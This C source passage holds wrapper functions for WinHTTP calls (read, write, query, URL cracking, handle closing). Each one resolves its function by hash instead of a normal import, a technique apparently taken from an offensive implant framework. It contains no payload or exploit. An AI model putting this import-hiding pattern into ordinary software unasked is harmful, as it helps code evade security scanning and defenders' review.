    dprintf("[WINAPI][winapi_winhttp_WinHttpReadData] Calling WinHttpReadData @ %p", pWinHttpReadData);
    if (pWinHttpReadData) {
        return pWinHttpReadData(hRequest, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
    }
    return FALSE;
}

BOOL winapi_winhttp_WinHttpQueryOption(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength) {
    BOOL (WINAPI *pWinHttpQueryOption)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength) = GetFunctionH(WINHTTP_DLL, H_WinHttpQueryOption);
    dprintf("[WINAPI][winapi_winhttp_WinHttpQueryOption] Calling WinHttpQueryOption @ %p", pWinHttpQueryOption);
    if (pWinHttpQueryOption) {
        return pWinHttpQueryOption(hInternet, dwOption, lpBuffer, lpdwBufferLength);
    }
    return FALSE;
}

BOOL winapi_winhttp_WinHttpCrackUrl(LPCWSTR pwszUrl, DWORD dwUrlLength, DWORD dwFlags, LPURL_COMPONENTS lpUrlComponents) {
    BOOL (WINAPI *pWinHttpCrackUrl)(LPCWSTR pwszUrl, DWORD dwUrlLength, DWORD dwFlags, LPURL_COMPONENTS lpUrlComponents) = GetFunctionH(WINHTTP_DLL, H_WinHttpCrackUrl);
    dprintf("[WINAPI][winapi_winhttp_WinHttpCrackUrl] Calling WinHttpCrackUrl @ %p", pWinHttpCrackUrl);
    if (pWinHttpCrackUrl) {
        return pWinHttpCrackUrl(pwszUrl, dwUrlLength, dwFlags, lpUrlComponents);
    }
    return FALSE;
}

BOOL winapi_winhttp_WinHttpCloseHandle(HINTERNET hInternet) {
    BOOL (WINAPI *pWinHttpCloseHandle)(HINTERNET) = GetFunctionH(WINHTTP_DLL, H_WinHttpCloseHandle);
    dprintf("[WINAPI][winapi_winhttp_WinHttpCloseHandle] Calling WinHttpCloseHandle @ %p", pWinHttpCloseHandle);
    if (pWinHttpCloseHandle) {
        return pWinHttpCloseHandle(hInternet);
    }
    return FALSE;
}

BOOL winapi_winhttp_WinHttpWriteData(HINTERNET hRequest, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten) {
    BOOL (WINAPI *pWinHttpWriteData)(HINTERNET, LPCVOID, DWORD, LPDWORD) = GetFunctionH(WINHTTP_DLL, H_WinHttpWriteData);
    dprintf("[WINAPI][winapi_winhttp_WinHttpWriteData] Calling WinHttpWriteData @ %p", pWinHttpWriteData);
    if (pWinHttpWriteData) {
        return pWinHttpWriteData(hRequest, lpBuffer, dwNumberOfBytesToWrite, lpdwNumberOfBytesWritten);
    }
    return FALSE;
}

// END: winhttp.dll
#endif
